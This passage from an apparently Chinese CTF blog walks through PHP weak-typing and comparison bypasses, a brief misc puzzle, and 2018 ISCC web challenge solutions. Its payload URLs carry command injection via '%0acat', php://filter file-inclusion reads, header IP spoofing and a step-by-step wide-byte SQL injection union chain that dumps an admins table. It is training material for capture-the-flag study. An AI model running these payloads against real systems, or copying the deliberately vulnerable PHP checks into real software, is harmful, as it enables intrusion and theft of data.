($_GET[&apos;password&apos;], &apos;--&apos;) !== FALSE)</span><br><span class="line">die(&apos;Flag: &apos; . $flag);</span><br><span class="line">else</span><br><span class="line">echo &apos;Invalid password&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里有两种方法<br></p>
<ul>
<li>?password=a%00–<br>因为ereg对%00截断</li>
<li>?password[]=a<br>因为ereg不能处理数组，返回null。===三个等号不会将null转化相同类型，从而null不等于FALSE，同样地strpos函数也不能处理数组，也会返回null</li>
</ul>
<h2 id="0x06-弱类型整数大小比较绕过"><a href="#0x06-弱类型整数大小比较绕过" class="headerlink" title="0x06 弱类型整数大小比较绕过"></a>0x06 弱类型整数大小比较绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$temp = $_GET[&apos;password&apos;];</span><br><span class="line">is_numeric($temp)?die(&quot;no numeric&quot;):NULL;</span><br><span class="line">if($temp&gt;1336)&#123;</span><br><span class="line">echo $flag;</span><br></pre></td></tr></table></figure>
<p>原理:php弱类型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/22.php?password=1444a</span><br></pre></td></tr></table></figure>
<h2 id="0x07-sha-函数比较绕过"><a href="#0x07-sha-函数比较绕过" class="headerlink" title="0x07 sha()函数比较绕过"></a>0x07 sha()函数比较绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line">if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">var_dump($_GET[&apos;name&apos;]);</span><br><span class="line">echo &quot;&quot;;</span><br><span class="line">var_dump($_GET[&apos;password&apos;]);</span><br><span class="line">var_dump(sha1($_GET[&apos;name&apos;]));</span><br><span class="line">var_dump(sha1($_GET[&apos;password&apos;]));</span><br><span class="line">if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;])</span><br><span class="line">echo &apos;Your password can not be your name!&apos;;</span><br><span class="line">else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;]))</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">echo &apos;Invalid password.&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">echo &apos;Login first!&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>sha1()存在数组漏洞，构造payload:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/7.php?name[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure></p>
<h2 id="0x08-md5加密相等绕过"><a href="#0x08-md5加密相等绕过" class="headerlink" title="0x08 md5加密相等绕过"></a>0x08 md5加密相等绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$md51 = md5(&apos;QNKCDZO&apos;);</span><br><span class="line">$a = @$_GET[&apos;a&apos;];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">echo &quot;flag&#123;*&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &quot;false!!!&quot;;</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo &quot;please input a&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><a href="https://ntwyc2018.github.io/2018/02/25/phpruoleixing/" target="_blank" rel="noopener">https://ntwyc2018.github.io/2018/02/25/phpruoleixing/</a></p>
<p>构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/13.php?a=s878926199a</span><br></pre></td></tr></table></figure></p>
<h2 id="0x09-十六进制与数字比较"><a href="#0x09-十六进制与数字比较" class="headerlink" title="0x09 十六进制与数字比较"></a>0x09 十六进制与数字比较</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function noother_says_correct($temp)</span><br><span class="line">&#123;</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">$one = ord(&apos;1&apos;); //ord — 返回字符的 ASCII 码值</span><br><span class="line">$nine = ord(&apos;9&apos;); //ord — 返回字符的 ASCII 码值</span><br><span class="line">$number = &apos;3735929054&apos;;</span><br><span class="line">// Check all the input characters!</span><br><span class="line">for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">&#123;</span><br><span class="line">// Disallow all the digits!</span><br><span class="line">$digit = ord($temp&#123;$i&#125;);</span><br><span class="line">if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">&#123;</span><br><span class="line">// Aha, digit not allowed!</span><br><span class="line">return &quot;flase&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if($number == $temp)</span><br><span class="line">return $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp = $_GET[&apos;password&apos;];</span><br><span class="line">echo noother_says_correct($temp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>十六进制绕过，将number的值转化为十六进制赋给password</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/20.php?password=0xdeadc0de</span><br></pre></td></tr></table></figure>
<p>写个python脚本转化即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(hex(3735929054))</span><br></pre></td></tr></table></figure></p>
<h2 id="0x10-ereg正则-00截断"><a href="#0x10-ereg正则-00截断" class="headerlink" title="0x10 ereg正则%00截断"></a>0x10 ereg正则%00截断</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;xxx&quot;;</span><br><span class="line">if (isset ($_GET[&apos;password&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;You password must be alphanumeric&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999)</span><br><span class="line">&#123;</span><br><span class="line">if (strpos ($_GET[&apos;password&apos;], &apos;-&apos;) !== FALSE) //strpos — 查找字符串首次出现的位置</span><br><span class="line">&#123;</span><br><span class="line">die(&apos;Flag: &apos; . $flag);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo(&apos;- have not been found&apos;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;Invalid password&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>第八行strlen等用科学计数法绕过，比如1e8<br><br>构造payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/5.php?password=1e8%00*-*</span><br></pre></td></tr></table></figure></p>
<h2 id="0x11-strpos数组绕过"><a href="#0x11-strpos数组绕过" class="headerlink" title="0x11 strpos数组绕过"></a>0x11 strpos数组绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line">if (isset ($_GET[&apos;ctf&apos;])) &#123;</span><br><span class="line">if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;ctf&apos;]) === FALSE)</span><br><span class="line">echo &apos;必须输入数字才行&apos;;</span><br><span class="line">else if (strpos ($_GET[&apos;ctf&apos;], &apos;#biubiubiu&apos;) !== FALSE)</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">echo &apos;骚年，继续努力吧啊~&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这个上面说过了，strpos不能处理数组，返回null<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/15.php?ctf[]=%00a</span><br></pre></td></tr></table></figure></p>
<h2 id="0x12-数字验证正则绕过"><a href="#0x12-数字验证正则绕过" class="headerlink" title="0x12 数字验证正则绕过"></a>0x12 数字验证正则绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">if (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;])</span><br><span class="line">&#123;</span><br><span class="line">$password = $_POST[&apos;password&apos;];</span><br><span class="line">if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;flag&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">while (TRUE)</span><br><span class="line">&#123;</span><br><span class="line">$reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">break;</span><br><span class="line">$c = 0;</span><br><span class="line">$ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">foreach ($ps as $pt)</span><br><span class="line">&#123;</span><br><span class="line">if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))</span><br><span class="line">$c += 1;</span><br><span class="line">&#125;</span><br><span class="line">if ($c &lt; 3) break;</span><br><span class="line">//&gt;=3，必须包含四种类型三种与三种以上</span><br><span class="line">if (&quot;42&quot; == $password) echo $flag;</span><br><span class="line">else echo &apos;Wrong password&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-bugkuCTF misc" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2018/07/06/bugkuCTF misc/" class="article-date">
      <time datetime="2018-07-06T05:24:35.523Z" itemprop="datePublished">2018-07-06</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2018/07/06/bugkuCTF misc/">bugkuCTF Misc</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="0x01-签到题"><a href="#0x01-签到题" class="headerlink" title="0x01 签到题"></a>0x01 签到题</h3><p>略</p>
<h3 id="0x02-这是一张单纯的图片"><a href="#0x02-这是一张单纯的图片" class="headerlink" title="0x02 这是一张单纯的图片"></a>0x02 这是一张单纯的图片</h3><p>用winhex打开在末尾处发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;</span><br></pre></td></tr></table></figure></p>
<p>可知是HTML实体,比如&amp;nbsp或者&amp;#nbsp是个不间断的空格<br><br>在线unicode解码得到key</p>
<h3 id="0x03-隐写"><a href="#0x03-隐写" class="headerlink" title="0x03 隐写"></a>0x03 隐写</h3>
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-2018 iscc web" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2018/07/06/2018 iscc web/" class="article-date">
      <time datetime="2018-07-06T05:24:35.523Z" itemprop="datePublished">2018-07-06</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2018/07/06/2018 iscc web/">2018 ISCC web</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="0x01-比较数字大小"><a href="#0x01-比较数字大小" class="headerlink" title="0x01 比较数字大小"></a>0x01 比较数字大小</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/4H4@FC%5BPFZORXP~LTRBG6GW.png" alt="image"></p>
<p>这个挺简单的了,直接F12修改maxlength的长度行了</p>
<h2 id="0x02-本地的诱惑"><a href="#0x02-本地的诱惑" class="headerlink" title="0x02 本地的诱惑"></a>0x02 本地的诱惑</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/W326J%7DGH%5DF%7DMB~%29%5DC8%28%28W9Y.png" alt="image"></p>
<p>这个好像是网络安全实验室平台上的一个原题,查看源代码即可</p>
<p><img src="http://p1vrkwaxt.bkt.clouddn.com/%7B6%60%7BQN9XM9%7D_3$TF%28O8$~OH.png" alt="image"> </p>
<h2 id="0x03-你能跨过去吗"><a href="#0x03-你能跨过去吗" class="headerlink" title="0x03 你能跨过去吗?"></a>0x03 你能跨过去吗?</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/YT%25WPO%7BOZQHC%5BN$XN28TR%7DE.png" alt="image"></p>
<p><img src="http://p1vrkwaxt.bkt.clouddn.com/W4~CNW~6J9ED5CS%5B6L%5DA%292P.png" alt="image"><br>据说是web+crypto题，先unescape解密再utf-7解密</p>
<h2 id="0x04-一切都是套路"><a href="#0x04-一切都是套路" class="headerlink" title="0x04 一切都是套路"></a>0x04 一切都是套路</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/IL%7BSKCOKWQLD%60E5S%7BN@7KBU.png" alt="image"></p>
<p>御剑扫不出来,尝试手动写，发现是index.php.txt这个文件没删.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)</span><br><span class="line">	die(&quot;flag is here&quot;);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">	die($_403);</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $k =&gt; $v)&#123;</span><br><span class="line">	$$k = $$v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach ($_POST as $k =&gt; $v)&#123;</span><br><span class="line">	$$k = $v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $_POST[&quot;flag&quot;] !== $flag )</span><br><span class="line">	die($_403);</span><br><span class="line"></span><br><span class="line">echo &quot;flag: &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>构造url如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8009/index.php/?_200=flag</span><br></pre></td></tr></table></figure></p>
<p>hackbar post如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=flag</span><br></pre></td></tr></table></figure></p>
<h2 id="0x05-你能绕过吗"><a href="#0x05-你能绕过吗" class="headerlink" title="0x05 你能绕过吗?"></a>0x05 你能绕过吗?</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/H%25M1%603V7V6LX%7B%5DC1ZJ5%28LAS.png" alt="image"></p>
<p>考点:文件包含漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8008/index.php?f=articles&amp;id=1</span><br></pre></td></tr></table></figure>
<ul>
<li>aticles.php报错error…,猜想里面本来就有一个.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8008/index.php?f=php://filter/read=convert.base64-encode/resource=index</span><br><span class="line">&amp;id=1</span><br></pre></td></tr></table></figure>
<p>报错error…,尝试把php改成pHp，成功，得到flag，猜想后台是用了正则表达式之一的/i</p>
<h2 id="0X06-web02"><a href="#0X06-web02" class="headerlink" title="0X06 web02"></a>0X06 web02</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/WGCX94R7MV6ZCG~%5D%25OWP2SC.png" alt="image"></p>
<p>点开后说自己并不是本机的ip，尝试伪造ip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For</span><br><span class="line">Client-IP</span><br><span class="line">x-remote-IP</span><br><span class="line">x-originating-IP</span><br><span class="line">x-remote-addr</span><br></pre></td></tr></table></figure></p>
<p>发现只有Client-IP：127.0.0.1是可以成功的</p>
<h2 id="0x07-请ping我的ip-看你能Ping通吗？"><a href="#0x07-请ping我的ip-看你能Ping通吗？" class="headerlink" title="0x07 请ping我的ip 看你能Ping通吗？"></a>0x07 请ping我的ip 看你能Ping通吗？</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/5TJX@H08T9Z_LER3%28SCK%28ZD.png" alt="image"></p>
<p>原理:命令注入漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8018/?ip=127.0.0.1%0acat%20index.php</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%0a符号</span><br><span class="line">换行符</span><br><span class="line">%0d符号</span><br><span class="line">回车符</span><br><span class="line">;符号</span><br><span class="line">在 shell 中，担任”连续指令”功能的符号就是”分号”</span><br><span class="line">&amp;符号</span><br></pre></td></tr></table></figure>
<p>这里的flag.txt被哪个人给删掉了，flag在/home目录下</p>
<h2 id="0x08-Please-give-me-username-and-password"><a href="#0x08-Please-give-me-username-and-password" class="headerlink" title="0x08 Please give me username and password!"></a>0x08 Please give me username and password!</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/1FN%5BLRJZ%2902G9%28XGINP%5BBV4.png" alt="image"></p>
<p>访问index.php.txt得到源码<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &quot;***********&quot;;	</span><br><span class="line">if(isset($_GET[&apos;username&apos;]))&#123;</span><br><span class="line">	if (0 == strcasecmp($flag,$_GET[&apos;username&apos;]))&#123;</span><br><span class="line">	$a = fla;</span><br><span class="line">	echo &quot;very good!Username is right&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">	print &apos;Username is not right&lt;!--index.php.txt--&gt;&apos;;&#125;</span><br><span class="line">&#125;else</span><br><span class="line">print &apos;Please give me username or password!&apos;;</span><br><span class="line">if (isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">	if (is_numeric($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">		if (strlen($_GET[&apos;password&apos;]) &lt; 4)&#123;</span><br><span class="line">			if ($_GET[&apos;password&apos;] &gt; 999)&#123;</span><br><span class="line">			$b = g;</span><br><span class="line">			print &apos;&lt;p&gt;very good!Password is right&lt;/p&gt;&apos;;</span><br><span class="line">		&#125;else </span><br><span class="line">			print &apos;&lt;p&gt;Password too little&lt;/p&gt;&apos;;</span><br><span class="line">		&#125;else</span><br><span class="line">		print &apos;&lt;p&gt;Password too long&lt;/p&gt;&apos;;</span><br><span class="line">	&#125;else</span><br><span class="line">	print &apos;&lt;p&gt;Password is not numeric&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">if ($a.$b == &quot;flag&quot;)</span><br><span class="line">	print $flag;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>科学计数法+数组漏洞绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8017/?password=9e9&amp;username[]=</span><br></pre></td></tr></table></figure>
<h2 id="0x09-SQL注入的艺术"><a href="#0x09-SQL注入的艺术" class="headerlink" title="0x09 SQL注入的艺术"></a>0x09 SQL注入的艺术</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/W%28%29T$ZS3~PKT_NN0%7BVE381I.png" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8015/index.php?id=1</span><br></pre></td></tr></table></figure>
<p>注入点在个人信息，进行尝试发现一直单引号没反应，想起sql宽字节注入，最后发现过滤了#,这里用%23绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8015/index.php?id=1%df&apos; and 1 =1%23</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8015/index.php?id=0%df&apos; union select 1,2,3,4,5,6,7,8%23</span><br></pre></td></tr></table></figure>
<p>测试后有8列</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8015/index.php?id=0%df&apos; union select 1,2,3,4,5,6,database(),8%23</span><br></pre></td></tr></table></figure>
<p>爆数据库为baji，显示为在2,4,7三个地方</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8015/index.php?id=0%df&apos; union select 1,2,3,4,5,6,group_concat(table_name) ,8 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure>
<p>爆表为admins</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8015/index.php?id=0%df&apos; union select 1,2,3,group_concat(column_name),5,6,7,8 from information_schema.columns where table_name=0x61646d696e73%23</span><br></pre></td></tr></table></figure>
<p>爆出字段为id,userName,userPwd,email,sex,role,money,flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8015/index.php?id=0%df&apos; union select 1,2,3,flag,5,6,7,8 from admins%23</span><br></pre></td></tr></table></figure>
<p>爆flag</p>
<h2 id="0x10-试试看"><a href="#0x10-试试看" class="headerlink" title="0x10 试试看"></a>0x10 试试看</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/E43ZVEASVIHC%7B6O_@UV0B%293.png" alt="image"></p>
<p>考点:文件包含漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=../flag.php</span><br></pre></td></tr></table></figure>
<p>查看源代码得到flag，中间的1.jpg/resource第一次见，长姿势了</p>
<h2 id="0x11-web01"><a href="#0x11-web01" class="headerlink" title="0x11 web01"></a>0x11 web01</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/TXOU%28T_7KX%5D5A1BQUZ_B8Z7.png" alt="image"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&apos;2.php&apos;); </span><br><span class="line">$flag=&apos;&#123;***************&#125;&apos;; </span><br><span class="line">if (isset($_GET[&apos;password&apos;])) &#123;   </span><br><span class="line">    if (strcmp($_GET[&apos;password&apos;], $flag) == 0)   </span><br><span class="line">        die(&apos;Flag: &apos;.$flag);   </span><br><span class="line">    else   </span><br><span class="line">        print &apos;Invalid password&apos;;   </span><br><span class="line">&#125;   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>这里利用strcmp函数数组漏洞即可</p>
